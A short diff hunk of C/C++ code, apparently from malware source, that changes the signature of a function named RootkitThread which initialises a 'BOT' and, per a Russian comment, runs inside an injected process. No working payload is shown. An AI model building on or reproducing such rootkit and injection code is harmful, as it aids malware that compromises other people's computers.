@@ -407,7 +407,9 @@ DWORD GetPidByThread(HANDLE hThread )
 	return -1;
 }
 
-DWORD WINAPI RootkitThread( LPVOID lpData, LPVOID, LPVOID )
+
+
+DWORD WINAPI RootkitThread(LPVOID)
 {
 	BOT::Initialize();
     // Поток работает в заинжекченном процессе
